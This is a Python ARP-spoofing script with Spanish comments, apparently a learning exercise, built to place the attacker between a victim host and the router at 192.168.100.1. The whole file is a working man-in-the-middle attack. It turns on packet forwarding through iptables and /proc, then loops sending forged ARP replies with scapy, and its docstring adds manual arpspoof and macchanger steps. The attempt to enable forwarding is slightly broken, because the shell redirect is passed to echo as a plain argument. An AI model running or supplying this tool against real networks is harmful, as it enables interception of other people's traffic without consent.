#!/usr/bin/env python3

"""
man in the middle attack with poisoned arp
#NOTE: Configura politicas para forwarding
> sudo iptables --policy FORWARD ACCEPT


#NOTE: Permite que interceptes el flujo sin perder comunicacion la victima
# Verificar que el
/proc/sys/net/ipv4/ip_forward contenga
1

INFO: una herramienta es arpspoof (sudo pacman -S dsniff)
c ambiamos de mac y ejecutamos
> macchanger -m <nueva_mac_address> <interface_de_red>
> arpspoof -i ens33 -t <ip_victioma> -r <ip_router>
"""

import argparse
import signal
import subprocess
import sys

import scapy.all as scapy
from termcolor import colored


def def_handler(sig, frame):
    print(colored("[!] Saliendo", "red"))
    sys.exit(1)


signal.signal(signal.SIGINT, def_handler)


def get_arguments():
    parser = argparse.ArgumentParser(description="ARP Spoofer")
    parser.add_argument(
        "-t",
        "--target",
        required=True,
        dest="ip_address",
        help="HOST / IP Range to Spoof",
    )
    options = parser.parse_args()
    print(options.ip_address)
    return options


def spoof(ip_address, spoof_ip):
    """
    Envenenamiento de arp para interceptar trafico
    """
    # NOTE: construimos una respuesta a la victima aunque no la solicitara asi
    # que apuntamos a la victima
    arp_packet = scapy.ARP(
        op=2, psrc=spoof_ip, pdst=ip_address, hwsrc="aa:bb:cc:44:55:66"
    )
    # NOTE: Solo enviamos el paquete falcificado
    scapy.send(arp_packet, verbose=False)


def main():

    # HACK: command to enable forwarding
    forwardin_command = ["iptables", "--policy", "FORWARD", "ACCEPT"]
    subprocess.run(forwardin_command)

    # HACK: dont lose comunication with victim and router
    change_proc_settings = ["echo", "1", ">", "/proc/sys/net/ipv4/ip_forward"]
    subprocess.run(change_proc_settings)

    subprocess.run(["cat", "/proc/sys/net/ipv4/ip_forward"])

    arguments = get_arguments()
    print(
        colored(
            f"[+] El host a interceptar es {arguments.ip_address}",
            "green",
        )
    )
    print(colored("Comunicacion interceptada...\n\n"))
    router_ip = "192.168.100.1"
    while True:
        spoof(arguments.ip_address, router_ip)
        spoof(router_ip, arguments.ip_address)


if __name__ == "__main__":
    main()
